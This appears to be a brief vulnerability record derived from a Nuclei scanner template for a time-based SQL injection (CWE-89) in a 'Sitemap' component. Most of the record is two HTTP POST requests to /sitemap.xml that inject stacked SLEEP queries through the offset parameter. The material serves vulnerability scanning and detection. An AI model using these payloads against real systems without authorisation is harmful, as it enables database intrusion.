# Vulnerability: Sitemap - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`sitemap-sql-injection.yaml`)

## Description
Sitemap is vulnerable to SQL Injection.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 15s
POST /sitemap.xml?offset=1;SELECT%20IF((SLEEP(6)),1,2356)# HTTP/1.1
Host: {{Hostname}}

@timeout: 25s
POST /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)# HTTP/1.1
Host: {{Hostname}}
```

